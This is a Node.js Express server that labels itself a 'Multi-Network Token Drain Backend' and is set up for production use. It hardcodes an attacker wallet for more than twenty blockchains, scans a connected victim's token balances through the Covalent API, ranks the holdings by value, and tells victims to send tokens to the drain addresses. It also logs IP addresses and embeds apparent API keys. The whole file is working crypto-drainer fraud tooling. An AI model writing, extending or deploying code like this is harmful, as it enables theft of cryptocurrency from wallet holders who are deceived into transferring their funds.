const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();

// ==================== PRODUCTION CONFIG ====================
console.log('🚀 PRODUCTION MODE: No private key needed');
console.log('💼 Users send tokens directly to chain-specific addresses');

// ==================== ALL NETWORK DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Mainnets
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Gnosis
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Celo
  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonbeam
  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Metis
  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Cronos
  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Harmony
  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Aurora
  42262: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Oasis Emerald
  1285: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonriver
  199: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BTT Chain
  128: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Huobi ECO
  66: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // OKX Chain
  321: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // KCC
  
  // Non-EVM Chains - Real addresses
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // BTC
  solana: "So11111111111111111111111111111111111111112", // SOL (placeholder)
  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // TRX (placeholder)
  cardano: "addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // ADA (placeholder)
  dogecoin: "Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // DOGE (placeholder)
  litecoin: "Lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // LTC (placeholder)
  ripple: "rxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // XRP (placeholder)
  polkadot: "1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // DOT (placeholder)
  cosmos: "cosmos1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // ATOM (placeholder)
  binance: "bnb1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // BNB Beacon (placeholder)
  
  // EVM Testnets (for testing)
  5: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Goerli
  97: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC Testnet
  80001: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Mumbai
  421613: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum Goerli
  11155111: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Sepolia
};

// ==================== RPC PROVIDERS ====================
const RPC_URLS = {
  1: `https://eth-mainnet.g.alchemy.com/v2/5s2Q6sN7j9w2xGvP3q9k8Lk7d0x3v5f5`,
  56: "https://bsc-dataseed1.binance.org/",
  137: "https://polygon-rpc.com",
  42161: "https://arb1.arbitrum.io/rpc",
  10: "https://mainnet.optimism.io",
  8453: "https://mainnet.base.org",
  43114: "https://api.avax.network/ext/bc/C/rpc",
  250: "https://rpc.ftm.tools",
  100: "https://rpc.gnosischain.com",
  42220: "https://forno.celo.org",
  1284: "https://rpc.ankr.com/moonbeam",
  1088: "https://andromeda.metis.io/?owner=1088",
  25: "https://evm.cronos.org",
  1666600000: "https://api.harmony.one",
  1313161554: "https://mainnet.aurora.dev",
  42262: "https://emerald.oasis.dev",
  1285: "https://rpc.api.moonriver.moonbeam.network",
  199: "https://rpc.bittorrentchain.io",
  128: "https://http-mainnet.hecochain.com",
  66: "https://exchainrpc.okex.org",
  321: "https://rpc-mainnet.kcc.network",
};

// ==================== ALL SUPPORTED NETWORKS ====================
const ALL_NETWORKS = [
  // EVM Mainnets
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', scan: true },
  { id: 56, name: 'Binance Smart Chain', symbol: 'BNB', type: 'evm', color: '#F0B90B', scan: true },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', scan: true },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', scan: true },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', scan: true },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', scan: true },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', scan: true },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', scan: true },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', scan: true },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', scan: true },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', scan: true },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', scan: true },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', scan: true },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', scan: true },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', scan: true },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', scan: true },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', scan: true },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', scan: true },
  { id: 128, name: 'Huobi ECO', symbol: 'HT', type: 'evm', color: '#2DAADF', scan: true },
  { id: 66, name: 'OKX Chain', symbol: 'OKT', type: 'evm', color: '#000000', scan: true },
  { id: 321, name: 'KCC', symbol: 'KCS', type: 'evm', color: '#6ED6F6', scan: true },
  
  // Non-EVM Chains
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', scan: false },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', scan: false },
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', scan: false },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', scan: false },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', scan: false },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', scan: false },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', scan: false },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', scan: false },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', scan: false },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B', scan: false },
  
  // EVM Testnets
  { id: 5, name: 'Goerli', symbol: 'ETH', type: 'evm', color: '#627EEA', testnet: true, scan: true },
  { id: 97, name: 'BSC Testnet', symbol: 'tBNB', type: 'evm', color: '#F0B90B', testnet: true, scan: true },
  { id: 80001, name: 'Mumbai', symbol: 'MATIC', type: 'evm', color: '#8247E5', testnet: true, scan: true },
  { id: 421613, name: 'Arbitrum Goerli', symbol: 'ETH', type: 'evm', color: '#28A0F0', testnet: true, scan: true },
  { id: 11155111, name: 'Sepolia', symbol: 'ETH', type: 'evm', color: '#627EEA', testnet: true, scan: true },
];

// ==================== APP SETUP ====================
app.use(cors());
app.use(express.json());

// ==================== DATABASE ====================
const logs = new Map();
const authLogs = new Map();
const tokenCache = new Map();

// ==================== ENDPOINTS ====================
app.get('/', (req, res) => {
  res.json({ 
    success: true,
    message: 'Multi-Network Token Drain Backend',
    version: '5.0.0',
    status: 'PRODUCTION',
    networks: ALL_NETWORKS.length,
    features: {
      evm: ALL_NETWORKS.filter(n => n.type === 'evm' && !n.testnet).length,
      non_evm: ALL_NETWORKS.filter(n => n.type === 'non-evm').length,
      testnets: ALL_NETWORKS.filter(n => n.testnet).length,
      scan: ALL_NETWORKS.filter(n => n.scan).length
    },
    note: 'Users send tokens directly to chain-specific addresses',
    endpoints: {
      'GET /': 'API info',
      'POST /auth': 'Authenticate wallet for ALL networks',
      'POST /log': 'Log transaction',
      'GET /scan/:address': 'Scan tokens across ALL networks',
      'GET /tokens/:address/:chainId': 'Get tokens for specific chain',
      'GET /networks': 'List ALL supported networks',
      'GET /health': 'Health check',
      'GET /stats': 'Statistics'
    },
    timestamp: new Date().toISOString()
  });
});

// ==================== AUTHENTICATE ALL NETWORKS ====================
app.post('/auth', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  const timestamp = new Date().toISOString();
  
  try {
    const { address, signature, message, networks = ALL_NETWORKS } = req.body;
    
    console.log(`🔐 [${requestId}] Auth request for ${address}`);
    
    // Validate address
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required",
        requestId
      });
    }
    
    // Verify signature if provided
    let signatureValid = false;
    if (signature && message) {
      try {
        const recoveredAddress = ethers.verifyMessage(message, signature);
        signatureValid = recoveredAddress.toLowerCase() === address.toLowerCase();
      } catch (error) {
        console.log(`⚠️ [${requestId}] Signature error:`, error.message);
      }
    }
    
    // Prepare network data with drain addresses
    const networkData = networks.map(network => {
      const drainAddress = DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1];
      return {
        id: network.id,
        name: network.name,
        symbol: network.symbol,
        type: network.type,
        drainAddress: drainAddress,
        canScan: network.scan || false
      };
    });
    
    // Store auth log
    const authLog = {
      id: requestId,
      address,
      signatureValid,
      networks: networkData.length,
      timestamp,
      ip: req.ip
    };
    
    if (!authLogs.has(address)) {
      authLogs.set(address, []);
    }
    authLogs.get(address).push(authLog);
    
    console.log(`✅ [${requestId}] Auth successful for ${address} across ${networkData.length} networks`);
    
    res.json({
      success: true,
      message: "Authentication successful for ALL networks",
      requestId,
      data: {
        authenticated: true,
        signatureValid,
        timestamp,
        address,
        networks: networkData,
        totalNetworks: networkData.length,
        instructions: {
          evm: "Send tokens directly from your wallet to the network-specific address",
          non_evm: "Manual transfer required for non-EVM chains",
          note: "Gas fees paid by sender"
        }
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Auth error:`, error);
    res.status(500).json({
      success: false,
      error: "Authentication failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== LOG TRANSACTION ====================
app.post('/log', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { 
      fromAddress,
      amount, 
      chainId = 1,
      tokenType = 'native',
      tokenAddress,
      transactionHash,
      signature,
      message
    } = req.body;
    
    // Validate address
    if (!fromAddress || !ethers.isAddress(fromAddress)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid fromAddress required",
        requestId
      });
    }
    
    // Get drain address for chain
    const drainAddress = DRAIN_ADDRESSES[chainId] || DRAIN_ADDRESSES[1];
    
    // Create log entry
    const logEntry = {
      id: requestId,
      fromAddress,
      toAddress: drainAddress,
      amount: amount || 'unknown',
      chainId,
      tokenType,
      tokenAddress: tokenAddress || null,
      transactionHash: transactionHash || null,
      signature: signature ? `${signature.substring(0, 10)}...` : null,
      timestamp: new Date().toISOString(),
      loggedAt: new Date().toISOString(),
      ip: req.ip
    };
    
    // Store log
    if (!logs.has(fromAddress)) {
      logs.set(fromAddress, []);
    }
    logs.get(fromAddress).push(logEntry);
    
    console.log(`📝 [${requestId}] Transaction logged from ${fromAddress} on chain ${chainId}`);
    
    res.json({
      success: true,
      message: "Transaction logged successfully",
      requestId,
      data: {
        loggedAt: logEntry.timestamp,
        fromAddress,
        toAddress: drainAddress,
        chainId,
        amount: amount || null,
        nextStep: "Complete transaction from your wallet"
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Log error:`, error);
    res.status(500).json({
      success: false,
      error: "Failed to log transaction",
      requestId,
      details: error.message
    });
  }
});

// ==================== SCAN ALL NETWORKS ====================
app.get('/scan/:address', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required",
        requestId
      });
    }
    
    console.log(`🌐 [${requestId}] Scanning ALL networks for ${address}`);
    
    const results = [];
    const promises = [];
    
    // Get EVM networks that support scanning
    const evmNetworks = ALL_NETWORKS.filter(n => n.type === 'evm' && n.scan && !n.testnet);
    
    // Scan each network in parallel
    for (const network of evmNetworks.slice(0, 20)) { // Limit to 20 for performance
      promises.push(
        (async () => {
          try {
            // Check cache first
            const cacheKey = `${address}:${network.id}`;
            const cached = tokenCache.get(cacheKey);
            
            if (cached && Date.now() - cached.timestamp < 60000) {
              if (cached.tokens.length > 0) {
                results.push({
                  network: {
                    id: network.id,
                    name: network.name,
                    symbol: network.symbol,
                    type: network.type,
                    color: network.color
                  },
                  tokens: cached.tokens,
                  summary: cached.summary,
                  cached: true
                });
              }
              return;
            }
            
            // Fetch from Covalent
            const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
            const url = `https://api.covalenthq.com/v1/${network.id}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
            
            const response = await fetch(url, { timeout: 5000 });
            
            if (response.ok) {
              const data = await response.json();
              const items = data.data?.items || [];
              
              const tokens = items
                .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
                .map(t => {
                  const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                  const value = (t.quote_rate || 0) * amount;
                  
                  return {
                    symbol: t.contract_ticker_symbol || (t.native_token ? network.symbol : 'TOKEN'),
                    name: t.contract_name || (t.native_token ? network.name : 'Unknown'),
                    amount: amount,
                    value: value,
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    isNative: t.native_token || false,
                    logo: t.logo_url,
                    networkId: network.id,
                    drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1]
                  };
                });
              
              if (tokens.length > 0) {
                const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
                
                results.push({
                  network: {
                    id: network.id,
                    name: network.name,
                    symbol: network.symbol,
                    type: network.type,
                    color: network.color
                  },
                  tokens,
                  summary: {
                    totalTokens: tokens.length,
                    totalValue: totalValue,
                    scannedAt: new Date().toISOString()
                  },
                  cached: false
                });
                
                // Cache result
                tokenCache.set(cacheKey, {
                  timestamp: Date.now(),
                  tokens,
                  summary: {
                    totalTokens: tokens.length,
                    totalValue: totalValue
                  }
                });
              }
            }
          } catch (error) {
            console.log(`[${requestId}] Scan failed for ${network.name}:`, error.message);
          }
        })()
      );
    }
    
    // Wait for all scans
    await Promise.allSettled(promises);
    
    // Add non-EVM chains as placeholders
    const nonEvmNetworks = ALL_NETWORKS.filter(n => n.type === 'non-evm');
    nonEvmNetworks.forEach(network => {
      results.push({
        network: {
          id: network.id,
          name: network.name,
          symbol: network.symbol,
          type: network.type,
          color: network.color
        },
        tokens: [{
          symbol: network.symbol,
          name: network.name,
          amount: 0,
          value: 0,
          contractAddress: null,
          isNative: true,
          decimals: network.symbol === 'BTC' ? 8 : 18,
          logo: null,
          networkId: network.id,
          drainAddress: DRAIN_ADDRESSES[network.id],
          note: "Non-EVM chain - manual verification needed"
        }],
        summary: {
          totalTokens: 1,
          totalValue: 0,
          scannedAt: new Date().toISOString()
        },
        cached: false
      });
    });
    
    // Calculate totals
    const totalTokens = results.reduce((sum, r) => sum + r.tokens.length, 0);
    const totalValue = results.reduce((sum, r) => sum + r.summary.totalValue, 0);
    const networksWithTokens = results.filter(r => r.tokens.length > 0).length;
    
    console.log(`✅ [${requestId}] Scan completed: ${networksWithTokens} networks, ${totalTokens} tokens`);
    
    res.json({
      success: true,
      data: {
        address,
        scannedAt: new Date().toISOString(),
        networksScanned: evmNetworks.length + nonEvmNetworks.length,
        networksWithTokens,
        results: results.sort((a, b) => b.summary.totalValue - a.summary.totalValue),
        summary: {
          totalNetworks: results.length,
          totalTokens,
          totalValue: totalValue.toFixed(2),
          evmNetworks: evmNetworks.length,
          nonEvmNetworks: nonEvmNetworks.length
        }
      },
      requestId
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Scan error:`, error);
    res.status(500).json({
      success: false,
      error: "Scan failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== GET TOKENS FOR SPECIFIC NETWORK ====================
app.get('/tokens/:address/:chainId', async (req, res) => {
  try {
    const { address, chainId } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    const network = ALL_NETWORKS.find(n => n.id.toString() === chainId.toString());
    if (!network) {
      return res.status(400).json({
        success: false,
        error: `Network ${chainId} not supported`
      });
    }
    
    // For EVM networks
    if (network.type === 'evm' && network.scan) {
      const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
      const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
      
      try {
        const response = await fetch(url);
        
        if (response.ok) {
          const data = await response.json();
          const items = data.data?.items || [];
          
          const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
              const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
              const value = (t.quote_rate || 0) * amount;
              
              return {
                symbol: t.contract_ticker_symbol || (t.native_token ? network.symbol : 'TOKEN'),
                name: t.contract_name || (t.native_token ? network.name : 'Unknown'),
                amount: amount,
                value: value,
                contractAddress: t.contract_address,
                decimals: t.contract_decimals || 18,
                isNative: t.native_token || false,
                logo: t.logo_url,
                networkId: parseInt(chainId),
                drainAddress: DRAIN_ADDRESSES[chainId] || DRAIN_ADDRESSES[1]
              };
            });
          
          res.json({
            success: true,
            data: {
              address,
              network: {
                id: network.id,
                name: network.name,
                type: network.type
              },
              tokens: tokens,
              summary: {
                totalTokens: tokens.length,
                totalValue: tokens.reduce((sum, t) => sum + (t.value || 0), 0),
                scannedAt: new Date().toISOString()
              }
            }
          });
        } else {
          throw new Error(`API response: ${response.status}`);
        }
      } catch (error) {
        console.error(`Fetch error for ${network.name}:`, error);
        res.status(500).json({ 
          success: false,
          error: error.message
        });
      }
    } else {
      // For non-EVM or unsupported networks
      res.json({
        success: true,
        data: {
          address,
          network: {
            id: network.id,
            name: network.name,
            type: network.type
          },
          tokens: [],
          summary: {
            totalTokens: 0,
            totalValue: 0,
            scannedAt: new Date().toISOString(),
            note: network.type === 'non-evm' ? 'Non-EVM chain support coming soon' : 'Network scan not supported'
          }
        }
      });
    }
    
  } catch (error) {
    console.error("Tokens endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== GET ALL NETWORKS ====================
app.get('/networks', (req, res) => {
  res.json({
    success: true,
    data: ALL_NETWORKS.map(network => ({
      id: network.id,
      name: network.name,
      symbol: network.symbol,
      type: network.type,
      color: network.color,
      testnet: network.testnet || false,
      scan: network.scan || false,
      drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
      enabled: true
    })),
    summary: {
      total: ALL_NETWORKS.length,
      evm: ALL_NETWORKS.filter(n => n.type === 'evm' && !n.testnet).length,
      non_evm: ALL_NETWORKS.filter(n => n.type === 'non-evm').length,
      testnets: ALL_NETWORKS.filter(n => n.testnet).length,
      scannable: ALL_NETWORKS.filter(n => n.scan).length
    }
  });
});

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
  res.json({ 
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
    stats: {
      networks: ALL_NETWORKS.length,
      cachedTokens: tokenCache.size,
      authLogs: Array.from(authLogs.values()).reduce((sum, logs) => sum + logs.length, 0),
      transactionLogs: Array.from(logs.values()).reduce((sum, logs) => sum + logs.length, 0)
    },
    mode: 'PRODUCTION',
    note: 'No private key required - Users send tokens directly'
  });
});

// ==================== STATISTICS ====================
app.get('/stats', (req, res) => {
  const uniqueAddresses = new Set([...logs.keys(), ...authLogs.keys()]);
  
  res.json({
    success: true,
    data: {
      addresses: {
        total: uniqueAddresses.size,
        withTransactions: logs.size,
        withAuth: authLogs.size
      },
      transactions: {
        total: Array.from(logs.values()).reduce((sum, logs) => sum + logs.length, 0),
        byChain: Array.from(logs.values())
          .flat()
          .reduce((acc, log) => {
            acc[log.chainId] = (acc[log.chainId] || 0) + 1;
            return acc;
          }, {})
      },
      cache: {
        tokenEntries: tokenCache.size,
        networksCached: new Set(Array.from(tokenCache.keys()).map(k => k.split(':')[1])).size
      }
    }
  });
});

// ==================== ERROR HANDLER ====================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    availableEndpoints: {
      "GET /": "API info",
      "POST /auth": "Authenticate for ALL networks",
      "POST /log": "Log transaction",
      "GET /scan/:address": "Scan tokens across ALL networks",
      "GET /tokens/:address/:chainId": "Get tokens for specific chain",
      "GET /networks": "List ALL supported networks",
      "GET /health": "Health check",
      "GET /stats": "Statistics"
    }
  });
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('='.repeat(70));
  console.log('🚀 MULTI-NETWORK TOKEN DRAIN BACKEND');
  console.log(`📡 Port: ${PORT}`);
  console.log(`🌐 Networks: ${ALL_NETWORKS.length}`);
  console.log(`   • EVM: ${ALL_NETWORKS.filter(n => n.type === 'evm' && !n.testnet).length}`);
  console.log(`   • Non-EVM: ${ALL_NETWORKS.filter(n => n.type === 'non-evm').length}`);
  console.log(`   • Testnets: ${ALL_NETWORKS.filter(n => n.testnet).length}`);
  console.log(`💰 Drain addresses configured for ALL chains`);
  console.log(`🔒 Mode: LOG-ONLY (No private key required)`);
  console.log('✅ Ready for production');
  console.log('='.repeat(70));
});
